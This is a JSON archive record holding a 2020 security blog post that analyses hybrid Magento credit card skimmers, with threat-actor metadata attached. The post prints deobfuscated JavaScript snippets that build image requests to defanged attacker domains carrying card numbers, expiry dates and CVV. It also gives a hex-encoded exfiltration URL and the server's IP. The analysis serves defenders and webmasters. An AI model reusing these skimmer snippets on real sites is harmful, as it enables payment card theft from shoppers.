{
    "id": "b24c84e6-704c-4266-b07d-99045a46b7b2",
    "created_at": "2023-01-12T15:06:58.860376Z",
    "updated_at": "2025-03-27T02:11:00.220021Z",
    "deleted_at": null,
    "sha1_hash": "8d59954d3e13a925ba5482a7cb8e882025476dc5",
    "title": "2020-06-05 - Evasion Tactics in Hybrid Credit Card Skimmers",
    "authors": "",
    "file_creation_date": "2022-05-28T19:33:12Z",
    "file_modification_date": "2022-05-28T19:33:12Z",
    "file_size": 249656,
    "plain_text": "# Sucuri Blog\n\n**[blog.sucuri.net/2020/06/evasion-tactics-in-hybrid-credit-card-skimmers.html](https://blog.sucuri.net/2020/06/evasion-tactics-in-hybrid-credit-card-skimmers.html)**\n\nDenis Sinegubko June 5, 2020\n\nThe most common type of Magento credit card stealing malware is client-side JavaScript\nthat grabs data entered in a checkout form and sends it to a third-party server controlled by\nthe attackers.\n\nThough popular with bad actors, one of the drawbacks of this approach is that it’s possible to\ntrack requests to suspicious servers if you monitor the traffic generated by checkout pages\n— or any other infected pages.\n\nA lesser-known, but still very popular, type of skimmer can instead be found harvesting\ninformation server-side. For example, when hackers modify one of the core Magento PHP\nfiles or payment module files that initially get the payment data from the checkout form. In\nsuch files, if an attacker adds a few lines of code, they’ll be able to redirect the customer\ninformation to a downloadable static file, email it, or send it to a third-party server.\n\nIn the case of server-side skimmers, the infection is absolutely invisible from the outside.\nThere is, however, one minor issue with this approach: It’s easy to spot modifications in core\nor known module files.\n\n## Hybrid Approach\n\nIn a hybrid approach, some hacker groups employ snippets of JavaScript that sends stolen\ndata to their own server-side scripts on the same compromised site, essentially serving as an\nevasive maneuver which helps them avoid visible requests to third-party servers. Requests\nsent to the site’s own domain are usually less scrutinized.\n\nThe server-side PHP scripts which receive the stolen information usually send it to a thirdparty server, which is not detectable from the outside. The script is created in a new file with\na legitimate-looking name, so that it can’t be easily compared with the original codebase.\nWith a bit of effort, attackers can modify their malicious code to look quite natural and may be\ntaken as just some benign customization.\n\nThese features allow the hybrid approach to circumvent some of the shortcomings found in\nboth client-side and server-side skimmers — but not all of them, however. For example, the\nclient-side part is detectable from the outside by web page scanners, and the server-side file\nwill most likely be reported by integrity control tools as a new addition. Moreover, hybrid\nskimmers are more complex as they involve two separate parts written in two different\nlanguages (usually JavaScript and PHP) and may require access to both the file system and\nthe database.\n\n\n-----\n\nThat being said, we do come across hybrid skimmers from time to time. Let s discuss a real\nworld example of malware employing this approach.\n\n## Client-Side of the Hybrid Skimmer\n\nSimilar to what our team regularly finds client-side on compromised ecommerce websites,\nthe first part of the malware is a typical JavaScript skimmer with two layers of obfuscation:\n\nOriginal JavaScript skimmer\nOnce deobfuscated, we find that it collects all the usual checkout form data such as credit\ncard number, expiration date, first and last names, etc. However, unlike a typical Magecart\nscript, this skimmer sends the stolen data to a URL on the same site instead of a specialized\nexfiltration URL on a third-party site.\n\nSending payment data to get.php\nMore specifically, the script creates a new image tag with the src attribute pointing to the\n**/get.php file on the same compromised site. The stolen data is passed along as GET**\nparameters to that image.\n\n## Server-Side Part of the Hybrid Skimmer\n\n\n-----\n\nOf course, that /get.php file has no intention of returning a real image. All it wants to do is\nobtain the payment details from the GET request whenever a browser tries to load the fake\nimage.\n\nIn essence, the get.php file pretends to be a legitimate file. It’s basically an old version of the\n**index.php file from Magento 1.x with just a couple of lines of malicious code added: lines 25**\nand 35.\n\nMalware at the top of an old index.php file\nLine 35 checks if there is a set “p” parameter of the request, then sends the value of this and\nthe “h” parameters to a third-party exfiltration URL. The address of that exfiltration server is\nencrypted on line 25.\n\nAfter the hex2bin decoding,\n“687474703a2f2f3138352e3131302e3133322e3232302f6c342e7068703f703d” turns into\n“hxxp://185.110.132[.220/l4.php?p=”.\n\n## Previous Variations of Skimmers Used by the Same Bad Actors\n\nOur team also traced more “classical” client-side skimmers back to this same server.\n\nFor example, in the jshost[.]org skimmer (2019), the decoded JavaScript malware looks\nvery similar. It uses the same “img” trick, with the main difference of using an external\nexfiltration address rather than a local address.\n```\n...\ni=document.createElement('img');\ni.src='hxxps://msm.jshost[.]org/l3.php?\np=222'+encodeURIComponent('&fln='+fln+'&ct='+ct+'&cn='+cn+'&cem='+cem+'&cey='+cey+'&cv\n...\n\n```\nAn even older (2016) scriptb[.]com version of this skimmer also used the same img trick.\n\n\n-----\n\n```\nvar i document.createElement( img );\ni.src = 'hxxps://scriptb[.]com/l2.php?p=197' + encodeURIComponent('&fln=' + fln +\n'&ct=' + ct + '&cn=' + cn + '&cem=' + cem + '&cey=' + cey + '&cvv=' + cvv + '&co=' +\nco + '&ci=' + ci + '&st=' + st + '&ad=' ++ '&zp=' + zp)\n\n```\nBoth jshost[.]org and scriptb[.]com domains pointed to the same 185.110.132.220 server\nin Russia.\n\nSince 2016, this very server has employed the exact same exfiltration filenames including\n**l.php, l2.php, l3.php, l4.php.**\n\nIf you try to open the files in a browser, you’ll find a regular 404 page. However, when you\nrequest any other URL that really shouldn’t be on the server, you’ll get a slightly different 404\npage, proving that the 404 response for these malicious l.php pages is fake.\n\n## Conclusion\n\nWeb skimmer authors are constantly testing new ways to circumnavigate detection and\nconceal their malware within compromised systems. To accomplish this and effectively\nharvest stolen data, one technique has been trending in credit card stealing malware: a\nhybrid approach, which sends stolen data to their own server-side scripts on the same\ncompromised site.\n\nFor webmasters, this means it’s really important that you are thorough during the cleanup\n[process when reviewing and removing malware reported by external scanners. There may](https://sucuri.net/guides/how-to-clean-a-hacked-website/)\nbe server-side parts of the credit card skimmer still lurking on the site. File system integrity\ncontrols can be helpful for locating recently added or modified files.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-05 - Evasion Tactics in Hybrid Credit Card Skimmers.pdf"
    ],
    "report_names": [
        "2020-06-05 - Evasion Tactics in Hybrid Credit Card Skimmers.pdf"
    ],
    "threat_actors": [
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536018,
    "ts_updated_at": 1743041460,
    "ts_creation_date": 1653766392,
    "ts_modification_date": 1653766392,
    "files": {
        "pdf": "https://archive.orkl.eu/8d59954d3e13a925ba5482a7cb8e882025476dc5.pdf",
        "text": "https://archive.orkl.eu/8d59954d3e13a925ba5482a7cb8e882025476dc5.txt",
        "img": "https://archive.orkl.eu/8d59954d3e13a925ba5482a7cb8e882025476dc5.jpg"
    }
}